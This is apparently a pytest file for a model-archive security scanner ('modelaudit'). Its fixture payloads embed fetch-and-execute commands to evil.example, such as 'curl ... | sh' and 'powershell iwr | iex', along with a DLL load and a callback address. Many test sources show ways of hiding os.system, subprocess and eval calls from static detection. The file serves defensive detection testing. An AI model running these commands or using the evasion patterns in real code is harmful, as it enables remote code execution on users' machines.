import bz2
import gzip
import io
import lzma
import os
import stat
import tarfile
import tempfile
import zipfile
import zlib
from collections.abc import Callable
from pathlib import Path
from typing import Any, ClassVar

import pytest

from modelaudit import core
from modelaudit.scanners import _registry, archive_dispatch
from modelaudit.scanners._archive_locations import rewrite_extracted_member_location
from modelaudit.scanners.archive_dispatch import (
    NESTED_SCAN_CALLBACK_CONFIG_KEY,
    _select_nested_scanner_id,
    scan_nested_file,
)
from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, BaseScanner, CheckStatus, IssueSeverity, ScanResult
from modelaudit.scanners.zip_scanner import ZipScanner
from modelaudit.utils.file.detection import PROTOBUF_MODEL_CANDIDATE_FORMAT
from tests.helpers import create_mock_onnx, prefix_mock_onnx_with_unknown_field


def _npy_payload() -> bytes:
    import numpy as np

    payload = io.BytesIO()
    np.save(payload, np.arange(3))
    return payload.getvalue()


def _malicious_cntkv2_payload() -> bytes:
    prefix = b"\x08\x01\x12\x11\x0a\x07version\x12\x06\x08\x01\x10\x03(\x02\x12\x09\x0a\x03uid\x12\x02ab"
    return (
        prefix
        + b" CompositeFunction primitive_functions native_user_function loadlibrary C:\\temp\\evil.dll "
        + b"powershell -c iwr http://evil.example/p.ps1 | iex base64.b64decode("
        + (b"A" * 96)
        + b") exec(payload) "
    )


def _malicious_lightgbm_payload() -> bytes:
    return (
        b"tree\nversion=v4\nnum_class=1\nnum_tree_per_iteration=1\nmax_feature_idx=2\n"
        b"feature_names=f0 f1\ntree_sizes=12\nTree=0\nnum_leaves=2\nsplit_feature=0\n"
        b"leaf_value=0.1 0.2\nmetadata=os.system('curl https://evil.example/p.sh | sh')\n"
    )


def _malicious_rknn_payload() -> bytes:
    return (
        b"RKNN\x01\x00\x00\x00"
        b"notes=cmd.exe /c curl https://evil.example/payload && powershell -enc AAAA\n"
        b"callback=http://198.51.100.5:8080/collect\n"
    )


def test_rewrite_extracted_member_location_preserves_scanner_specific_suffix_policy() -> None:
    assert (
        rewrite_extracted_member_location(
            "/tmp/extracted.pkl:nested.pkl",
            "/tmp/extracted.pkl",
            "/archive.zip:model.pkl",
            preserve_non_delimited_suffix=False,
        )
        == "/archive.zip:model.pkl:nested.pkl"
    )
    assert (
        rewrite_extracted_member_location(
            "/tmp/extracted.pkl.extra",
            "/tmp/extracted.pkl",
            "/archive.zip:model.pkl",
            preserve_non_delimited_suffix=False,
        )
        == "/archive.zip:model.pkl"
    )
    assert (
        rewrite_extracted_member_location(
            "/tmp/extracted.pkl.extra",
            "/tmp/extracted.pkl",
            "/archive.7z:model.pkl",
            preserve_non_delimited_suffix=True,
        )
        == "/archive.7z:model.pkl.extra"
    )
    assert (
        rewrite_extracted_member_location(
            "/tmp/extracted.pkl2",
            "/tmp/extracted.pkl",
            "/archive.zip:model.pkl",
            preserve_non_delimited_suffix=False,
        )
        == "/archive.zip:model.pkl /tmp/extracted.pkl2"
    )


@pytest.mark.parametrize(
    ("payload", "filename"),
    [
        (gzip.compress(b"payload", mtime=0), "gzip_member"),
        (bz2.compress(b"payload"), "bzip2_member"),
        (lzma.compress(b"payload"), "xz_member"),
        (b"\x04\x22\x4d\x18" + b"\x00" * 8, "lz4_member"),
        (zlib.compress(b"payload"), "zlib_member"),
    ],
    ids=["gzip_member", "bzip2_member", "xz_member", "lz4_member", "zlib_member"],
)
def test_nested_dispatch_routes_compressed_header_aliases_to_compressed_scanner(
    tmp_path: Path,
    payload: bytes,
    filename: str,
) -> None:
    """Extensionless archive members with compression magic should route to CompressedScanner."""
    member_path = tmp_path / filename
    member_path.write_bytes(payload)

    assert _select_nested_scanner_id(str(member_path)) == "compressed"


def test_scan_zip_flags_dangerous_python_member(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", "import os\nos.system('echo hidden')\n")

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].severity == IssueSeverity.WARNING
    assert python_checks[0].details["entry"] == "handler.py"


def test_scan_zip_flags_aliased_dangerous_python_member(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", "import subprocess as sp\nsp.run(['echo', 'hidden'], check=False)\n")

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].severity == IssueSeverity.WARNING
    assert python_checks[0].details["reason"] == "high-risk calls: subprocess.run"


@pytest.mark.parametrize(
    "source",
    [
        "import os\nos.system.__call__('echo hidden')\n",
        "import os\nrun = os.system\nrun.__call__('echo hidden')\n",
        "import os\ngetattr(os.system, '__call__')('echo hidden')\n",
        "import os\ninvoke = os.system.__call__\nos.system = len\ninvoke('echo hidden')\n",
        "import os\nrun = os.system\nos.system = len\nrun('echo hidden')\n",
        "import os\nfrom os import system as run\nos.system = len\nrun('echo hidden')\n",
        "import os\nfrom os import *\nos.system = len\nsystem('echo hidden')\n",
        ("import os\ndef run(action=os.system):\n    os.system = len\n    action('echo hidden')\n"),
        "import os\nrun = os.system\nsetattr(os, 'system', len)\nrun('echo hidden')\n",
        "import os\nrun = os.system\nos.__dict__.update({'system': len})\nrun('echo hidden')\n",
        (
            "import os\n"
            "replace = os.__dict__.update\n"
            "replace = lambda values: None\n"
            "replace({'system': len})\n"
            "os.system('echo hidden')\n"
        ),
        "import os\nif replace:\n    os.__dict__.update({'system': len})\nos.system('echo hidden')\n",
        "import os\nif swap:\n    os = make_module()\nos.__dict__.update({'system': len})\nos.system('echo hidden')\n",
        "import os\nif swap:\n    os = make_module()\nsetattr(os, 'system', len)\nos.system('echo hidden')\n",
        "import os\nif swap:\n    os = make_module()\nos.system = len\nos.system('echo hidden')\n",
        (
            "import os\nif swap:\n    os = make_module()\ntarget = os\n"
            "target.__dict__.update({'system': len})\nos.system('echo hidden')\n"
        ),
        (
            "import os\nif swap:\n    os = make_module()\ntarget = os\n"
            "setattr(target, 'system', len)\nos.system('echo hidden')\n"
        ),
        ("import os\nif swap:\n    os = make_module()\ntarget = os\ntarget.system = len\nos.system('echo hidden')\n"),
        (
            "import os\ndef hide(target=os):\n"
            "    target.__dict__.update({'system': len})\n"
            "    os.system('echo hidden')\n"
        ),
        (
            "import os\nresolve = getattr\nif swap:\n    resolve = make_resolver()\n"
            "resolve(os, '__dict__').update({'system': len})\nos.system('echo hidden')\n"
        ),
        (
            "import os\nnamespace = os.__dict__\nif swap:\n    namespace = make_mapping()\n"
            "namespace.update({'system': len})\nos.system('echo hidden')\n"
        ),
        (
            "import os\ndef hide(namespace=os.__dict__):\n"
            "    namespace.update({'system': len})\n"
            "    os.system('echo hidden')\n"
        ),
        (
            "import os\nreplace = dict.update\nif swap:\n    replace = lambda target, values: None\n"
            "replace(os.__dict__, {'system': len})\nos.system('echo hidden')\n"
        ),
        (
            "import os\ndef hide(namespace=os.__dict__):\n"
            "    dict.update(namespace, {'system': len})\n"
            "    os.system('echo hidden')\n"
        ),
        "import os\nrun = os.__dict__.pop('system')\nrun('echo hidden')\n",
        "import os\nif remove:\n    os.__dict__.pop('system')\nos.system('echo hidden')\n",
        "import os\nif remove:\n    del os.__dict__['system']\nos.system('echo hidden')\n",
        "import os\nif remove:\n    os.__dict__.__delitem__('system')\nos.system('echo hidden')\n",
        (
            "import os\nimport operator\nif remove:\n"
            "    operator.delitem(os.__dict__, 'system')\nos.system('echo hidden')\n"
        ),
        "import os\nrun = os.system\nos.__dict__.clear()\nrun('echo hidden')\n",
        "import os\nif remove:\n    os.__dict__.clear()\nos.system('echo hidden')\n",
        "import os\nif swap:\n    os = make_module()\nos.__dict__.clear()\nos.system('echo hidden')\n",
        ("import os\ndef hide(target=os):\n    setattr(target, 'system', len)\n    os.system('echo hidden')\n"),
        ("import os\ndef hide(target=os):\n    target.system = len\n    os.system('echo hidden')\n"),
        (
            "import os\n"
            "setattr = lambda target, key, value: None\n"
            "setattr(os, 'system', len)\n"
            "os.system('echo hidden')\n"
        ),
    ],
)
def test_scan_zip_preserves_captured_dangerous_callable_before_overwrite(tmp_path: Path, source: str) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].details["reason"] == "high-risk calls: os.system"


@pytest.mark.parametrize(
    "source",
    [
        "import os\nos.system = len\nos.system.__call__([])\n",
        "import os\nos.system = len\ngetattr(os.system, '__call__')([])\n",
        "import os\nos.system = len\ninvoke = os.system.__call__\ninvoke([])\n",
        "import os\nos.system = len\nrun = os.system\nrun([])\n",
        "import os\nos.system = len\nfrom os import system as run\nrun([])\n",
        "import os\nos.system = len\nfrom os import *\nsystem([])\n",
        ("import os\nos.system = len\ndef run(action=os.system):\n    action([])\n"),
        "import os\nsetattr(os, 'system', len)\nos.system([])\n",
        "import os\nreplace = setattr\nreplace(os, 'system', len)\nos.system([])\n",
        "import os\nresult = setattr(os, 'system', len)\nos.system([])\n",
        "import os\nresult: None = setattr(os, 'system', len)\nos.system([])\n",
        "import os\nsetattr(os, 'system', len)\nrun = os.system\nrun([])\n",
        "import os\nos.__dict__.__setitem__('system', len)\nos.system([])\n",
        "import os\nos.__dict__.update({'system': len})\nos.system([])\n",
        "import os\nvars(os).update({'system': len})\nos.system([])\n",
        "import os\nreplace = os.__dict__.update\nreplace({'system': len})\nos.system([])\n",
        "import os\nresult = os.__dict__.update({'system': len})\nos.system([])\n",
        "import os\nos.__dict__.update({'system': len})\nrun = os.system\nrun([])\n",
        "import os\ngetattr(os, '__dict__').update({'system': len})\nos.system([])\n",
        "import os\nos.__getattribute__('__dict__').update({'system': len})\nos.system([])\n",
        "import os\nobject.__getattribute__(os, '__dict__').update({'system': len})\nos.system([])\n",
        "import os\nnamespace = os.__dict__\nnamespace.update({'system': len})\nos.system([])\n",
        "import os\nnamespace = getattr(os, '__dict__')\nnamespace.update({'system': len})\nos.system([])\n",
        "import os\nreplace = getattr(os, '__dict__').update\nreplace({'system': len})\nos.system([])\n",
        "import os\ndict.update(os.__dict__, {'system': len})\nos.system([])\n",
        "import os\ndict.__setitem__(os.__dict__, 'system', len)\nos.system([])\n",
        "import os\nimport operator\noperator.setitem(os.__dict__, 'system', len)\nos.system([])\n",
        "import os\nfrom operator import setitem as replace\nreplace(os.__dict__, 'system', len)\nos.system([])\n",
        "import os\nos.__dict__.pop('system')\nos.system([])\n",
        "import os\nremove = os.__dict__.pop\nremove('system')\nos.system([])\n",
        "import os\ndict.pop(os.__dict__, 'system')\nos.system([])\n",
        "import os\ndel os.__dict__['system']\nos.system([])\n",
        "import os\ndel os.system\nos.system([])\n",
        "import os\nos.__dict__.__delitem__('system')\nos.system([])\n",
        "import os\nremove = os.__dict__.__delitem__\nremove('system')\nos.system([])\n",
        "import os\ndict.__delitem__(os.__dict__, 'system')\nos.system([])\n",
        "import os\nimport operator\noperator.delitem(os.__dict__, 'system')\nos.system([])\n",
        "import os\nos.__dict__.clear()\nos.system([])\n",
        "import os\nvars(os).clear()\nos.system([])\n",
        "import os\nclear = os.__dict__.clear\nclear()\nos.system([])\n",
        "import os\ndict.clear(os.__dict__)\nos.system([])\n",
        "import subprocess\nsubprocess.__dict__.update({'run': len})\nsubprocess.run([])\n",
        "import subprocess\nsubprocess.__dict__.pop('run')\nsubprocess.run([])\n",
        "import subprocess\nsubprocess.__dict__.clear()\nsubprocess.run([])\n",
    ],
)
def test_scan_zip_allows_callable_captured_after_safe_overwrite(tmp_path: Path, source: str) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert not any(check.name == "Python Archive Member Security" for check in result.checks)


def test_scan_zip_flags_from_import_dangerous_python_member(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", "from subprocess import run\nrun('echo hidden', shell=True)\n")

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].severity == IssueSeverity.WARNING
    assert python_checks[0].details["reason"] == "high-risk calls: subprocess.run"


@pytest.mark.parametrize(
    "source",
    [
        "import os\nimport subprocess\nsetattr(os, 'system', subprocess.run)\nos.system(['id'])\n",
        "import os\nimport subprocess\nresult = setattr(os, 'system', subprocess.run)\nos.system(['id'])\n",
        "import os\nimport subprocess\nos.__dict__.update({'system': subprocess.run})\nos.system(['id'])\n",
        "import os\nimport subprocess\nos.__dict__.__setitem__('system', subprocess.run)\nos.system(['id'])\n",
        "import os\nimport subprocess\ngetattr(os, '__dict__').update({'system': subprocess.run})\nos.system(['id'])\n",
        (
            "import os\nimport subprocess\nnamespace = os.__dict__\n"
            "namespace.update({'system': subprocess.run})\nos.system(['id'])\n"
        ),
        "import os\nimport subprocess\ndict.update(os.__dict__, {'system': subprocess.run})\nos.system(['id'])\n",
        (
            "import os\nimport operator\nimport subprocess\n"
            "operator.setitem(os.__dict__, 'system', subprocess.run)\nos.system(['id'])\n"
        ),
        (
            "import os\nimport subprocess\nos.__dict__.clear()\n"
            "os.__dict__.update({'system': subprocess.run})\nos.system(['id'])\n"
        ),
    ],
)
def test_scan_zip_reports_dangerous_setattr_replacement(tmp_path: Path, source: str) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].details["reason"] == "high-risk calls: subprocess.run"


@pytest.mark.parametrize(
    ("source", "dangerous_name"),
    [
        (
            "import os\nimport subprocess\nsubprocess.__dict__.update({'run': os.system})\nsubprocess.run('id')\n",
            "os.system",
        ),
        (
            "import subprocess\nrun = subprocess.Popen\nsubprocess.__dict__.clear()\n"
            "subprocess.__dict__.update({'run': run})\nsubprocess.run([])\n",
            "subprocess.Popen",
        ),
        ("import subprocess\nsubprocess.__dict__.pop('run')(['id'])\n", "subprocess.run"),
    ],
)
def test_scan_zip_reports_dangerous_subprocess_mapping_replacement(
    tmp_path: Path, source: str, dangerous_name: str
) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].details["reason"] == f"high-risk calls: {dangerous_name}"


def test_scan_zip_flags_wildcard_import_dangerous_python_member(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", "from subprocess import *\nrun(['echo', 'hidden'], check=False)\n")

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].severity == IssueSeverity.WARNING
    assert python_checks[0].details["reason"] == "high-risk calls: subprocess.run"


def test_scan_zip_flags_builtins_getattr_keyword_call_dangerous_python_member(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = "import builtins as bi\nimport os\nbi.getattr(object=os, name='system').__call__('echo hidden')\n"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].severity == IssueSeverity.WARNING
    assert python_checks[0].rule_code == "S101"
    assert python_checks[0].details["reason"] == "high-risk calls: os.system"


@pytest.mark.parametrize(
    "source",
    [
        "__builtins__['ev' + 'al']('1 + 1')\n",
        "getattr(__builtins__, 'eval')('1 + 1')\n",
        "__builtins__.__dict__.get('eval')('1 + 1')\n",
        "globals()['__builtins__']['ev' + 'al']('1 + 1')\n",
        "globals().get('__builtins__').get('eval')('1 + 1')\n",
        "getattr(globals()['__builtins__'], 'eval')('1 + 1')\n",
        "namespace = globals()\nnamespace['__builtins__']['ev' + 'al']('1 + 1')\n",
        "namespace = globals()\nnamespace.get('__builtins__').get('eval')('1 + 1')\n",
        "namespace = globals()\ngetattr(namespace['__builtins__'], 'eval')('1 + 1')\n",
        "lookup = globals().get\nlookup('__builtins__').get('ev' + 'al')('1 + 1')\n",
        "namespace = globals()\nlookup = namespace.get\nlookup('__builtins__')['ev' + 'al']('1 + 1')\n",
        "lookup = globals()['__builtins__'].get\nlookup('ev' + 'al')('1 + 1')\n",
        "lookup = globals()['__builtins__'].__getitem__\nlookup('ev' + 'al')('1 + 1')\n",
        ("run = globals()['__builtins__']['eval']\nglobals()['__builtins__']['eval'] = len\nrun.__call__('1 + 1')\n"),
        "run = globals()['__builtins__']['eval']\nglobals()['__builtins__']['eval'] = len\nrun('1 + 1')\n",
        ("run = globals()['__builtins__']['eval']\nglobals()['__builtins__'].__setitem__('eval', len)\nrun('1 + 1')\n"),
        (
            "run = globals()['__builtins__']['eval']\n"
            "replace = globals()['__builtins__'].__setitem__\n"
            "replace('eval', len)\n"
            "run('1 + 1')\n"
        ),
        (
            "run = globals()['__builtins__']['eval']\n"
            "globals()['__builtins__']['eval'] = __builtins__['exec']\n"
            "run('1 + 1')\n"
        ),
        "globals()['__builtins__'].pop('eval')('1 + 1')\n",
        "run = globals()['__builtins__'].pop('eval')\nrun('1 + 1')\n",
        "if remove:\n    del globals()['__builtins__']['eval']\nglobals()['__builtins__']['eval']('1 + 1')\n",
        "run = globals()['__builtins__']['eval']\nglobals()['__builtins__'].clear()\nrun('1 + 1')\n",
        "if remove:\n    globals()['__builtins__'].clear()\nglobals()['__builtins__']['eval']('1 + 1')\n",
    ],
)
def test_scan_zip_flags_implicit_builtins_dangerous_python_member(tmp_path: Path, source: str) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].rule_code == "S104"
    assert python_checks[0].details["reason"] == "high-risk calls: __builtins__.eval"


@pytest.mark.parametrize(
    "source",
    [
        "callbacks = {'eval': len}\ncallbacks['eval']([])\n",
        "import builtins as bi\nbi.open('labels.json', 'r')\n",
        "globals()['__builtins__']['len']([1])\n",
        "globals = lambda: {'__builtins__': {'eval': len}}\nglobals()['__builtins__']['eval']([])\n",
        "namespace = globals()\nnamespace['__builtins__']['len']([1])\n",
        ("namespace = globals()\nnamespace = {'__builtins__': {'eval': len}}\nnamespace['__builtins__']['eval']([])\n"),
        ("namespace = globals()\nnamespace['__builtins__']['eval'] = len\nnamespace['__builtins__']['eval']([])\n"),
        "lookup = globals().get\nlookup('__builtins__').get('len')([1])\n",
        "mapping = {'eval': len}\nlookup = mapping.get\nlookup('eval')([])\n",
        "globals()['__builtins__'].__setitem__('eval', len)\nglobals()['__builtins__']['eval']([])\n",
        "globals()['__builtins__'].update({'eval': len})\nglobals()['__builtins__']['eval']([])\n",
        (
            "replace = globals()['__builtins__'].__setitem__\n"
            "replace('eval', len)\n"
            "globals()['__builtins__']['eval']([])\n"
        ),
        ("replace = globals()['__builtins__'].update\nreplace({'eval': len})\nglobals()['__builtins__']['eval']([])\n"),
        "import builtins\nbuiltins.__dict__.update({'eval': len})\nbuiltins.eval([])\n",
        "import builtins\nreplace = builtins.__dict__.update\nreplace({'eval': len})\nbuiltins.eval([])\n",
        "globals()['__builtins__']['eval'] = len\nrun = globals()['__builtins__']['eval']\nrun([])\n",
        ("globals()['__builtins__']['eval'] = len\nrun = globals()['__builtins__']['eval']\nrun.__call__([])\n"),
        ("globals()['__builtins__'].__setitem__('eval', len)\nrun = globals()['__builtins__']['eval']\nrun([])\n"),
        (
            "replace = globals()['__builtins__'].__setitem__\n"
            "replace('eval', len)\n"
            "run = globals()['__builtins__']['eval']\n"
            "run([])\n"
        ),
        "globals()['__builtins__'].pop('eval')\nglobals()['__builtins__']['eval']([])\n",
        "remove = globals()['__builtins__'].pop\nremove('eval')\nglobals()['__builtins__']['eval']([])\n",
        "del globals()['__builtins__']['eval']\nglobals()['__builtins__']['eval']([])\n",
        "globals()['__builtins__'].__delitem__('eval')\nglobals()['__builtins__']['eval']([])\n",
        "globals()['__builtins__'].clear()\nglobals()['__builtins__']['eval']([])\n",
        "import builtins\nbuiltins.__dict__.clear()\nbuiltins.eval([])\n",
        "import builtins\ndict.clear(builtins.__dict__)\nbuiltins.eval([])\n",
    ],
)
def test_scan_zip_allows_benign_builtin_shaped_source(tmp_path: Path, source: str) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert not any(check.name == "Python Archive Member Security" for check in result.checks)


@pytest.mark.parametrize(
    ("source", "dangerous_name"),
    [
        (
            "namespace = globals()\n"
            "namespace['__builtins__']['eval'] = __builtins__['exec']\n"
            "namespace['__builtins__']['eval']('pass')\n",
            "__builtins__.exec",
        ),
        (
            "globals()['__builtins__'].__setitem__('eval', __builtins__['exec'])\n"
            "globals()['__builtins__']['eval']('pass')\n",
            "__builtins__.exec",
        ),
        (
            "globals()['__builtins__'].update({'eval': __builtins__['exec']})\n"
            "globals()['__builtins__']['eval']('pass')\n",
            "__builtins__.exec",
        ),
        (
            "replace = globals()['__builtins__'].__setitem__\n"
            "replace('eval', __builtins__['exec'])\n"
            "globals()['__builtins__']['eval']('pass')\n",
            "__builtins__.exec",
        ),
        (
            "replace = globals()['__builtins__'].update\n"
            "replace({'eval': __builtins__['exec']})\n"
            "globals()['__builtins__']['eval']('pass')\n",
            "__builtins__.exec",
        ),
        (
            "import builtins\nbuiltins.__dict__.update({'eval': builtins.exec})\nbuiltins.eval('pass')\n",
            "builtins.exec",
        ),
    ],
)
def test_scan_zip_reports_dangerous_builtin_reassignment(tmp_path: Path, source: str, dangerous_name: str) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].rule_code == "S104"
    assert python_checks[0].details["reason"] == f"high-risk calls: {dangerous_name}"


def test_scan_zip_flags_aliased_getattr_helper_dangerous_python_member(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "from builtins import getattr as resolve\n"
        "import os as operating_system\n"
        "resolve(object=operating_system, name='system')('echo hidden')\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].severity == IssueSeverity.WARNING
    assert python_checks[0].rule_code == "S101"
    assert python_checks[0].details["reason"] == "high-risk calls: os.system"


def test_scan_zip_flags_concatenated_getattr_name_dangerous_python_member(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = "import os\ngetattr(os, 'sys' + 'tem')('echo hidden')\n"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].severity == IssueSeverity.WARNING
    assert python_checks[0].rule_code == "S101"
    assert python_checks[0].details["reason"] == "high-risk calls: os.system"


@pytest.mark.parametrize(
    "source",
    [
        "import os\nos.__dict__['sys' + 'tem']('echo hidden')\n",
        "import os as operating_system\nvars(operating_system)['system']('echo hidden')\n",
        "import os\nos.__dict__.get('sys' + 'tem')('echo hidden')\n",
        "import os\nvars(os).get('system')('echo hidden')\n",
        "import os\ngetattr(os, '__dict__')['system']('echo hidden')\n",
        "import os\ngetattr(os, '__dict__').get('system')('echo hidden')\n",
        "import os\nos.__dict__.pop('system')('echo hidden')\n",
        "import os\nos.__dict__.setdefault('system', None)('echo hidden')\n",
        "import os\nos.__getattribute__('system')('echo hidden')\n",
        "import os\nobject.__getattribute__(os, 'system')('echo hidden')\n",
        "import os\ncommands = os.__dict__\ncommands['system']('echo hidden')\n",
        "import os\ncommands = vars(os)\ncommands.get('system')('echo hidden')\n",
        "import os\ncommands = getattr(os, '__dict__')\ncommands['system']('echo hidden')\n",
    ],
    ids=[
        "module_dict",
        "vars_module",
        "module_dict_get",
        "vars_get",
        "getattr_dict",
        "getattr_dict_get",
        "module_dict_pop",
        "module_dict_setdefault",
        "module_getattribute",
        "object_getattribute",
        "assigned_module_dict",
        "assigned_vars",
        "assigned_getattr_dict",
    ],
)
def test_scan_zip_flags_static_namespace_dangerous_python_member(tmp_path: Path, source: str) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].severity == IssueSeverity.WARNING
    assert python_checks[0].rule_code == "S101"
    assert python_checks[0].details["reason"] == "high-risk calls: os.system"


def test_scan_zip_bounds_large_concatenated_getattr_names(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    padding = " + ".join(["''"] * 300)
    source = f"import os\ngetattr(os, 'sys' + {padding} + 'tem')('echo hidden')\n"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert not any(
        check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED for check in result.checks
    )


def test_scan_zip_flags_padded_split_literal_getattr_name(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    padding = " + ".join(["''"] * 160)
    source = f"import os\ngetattr(os, 'sys' + {padding} + 'tem')('echo hidden')\n"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert any(
        check.name == "Python Archive Member Security"
        and check.status == CheckStatus.FAILED
        and check.details["reason"] == "high-risk calls: os.system"
        for check in result.checks
    )


def test_scan_zip_flags_rebound_dangerous_python_member(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = "import subprocess\nrunner = subprocess.run\nrunner(['echo', 'hidden'], check=False)\n"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].severity == IssueSeverity.WARNING
    assert python_checks[0].details["reason"] == "high-risk calls: subprocess.run"


def test_scan_zip_flags_default_rebound_dangerous_python_member(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import subprocess\ndef handler(runner=subprocess.run) -> None:\n    runner(['echo', 'hidden'], check=False)\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].severity == IssueSeverity.WARNING
    assert python_checks[0].details["reason"] == "high-risk calls: subprocess.run"


def test_scan_zip_import_aliases_are_scoped_per_python_member(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import subprocess\n"
        "def helper() -> str:\n"
        "    import os as subprocess\n"
        "    return subprocess.getcwd()\n"
        "def handler() -> None:\n"
        "    subprocess.run(['echo', 'hidden'], check=False)\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].details["reason"] == "high-risk calls: subprocess.run"


def test_scan_zip_method_does_not_capture_class_attribute_alias(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import subprocess\n"
        "class Handler:\n"
        "    subprocess = None\n"
        "    def run(self) -> None:\n"
        "        subprocess.run(['echo', 'hidden'], check=False)\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

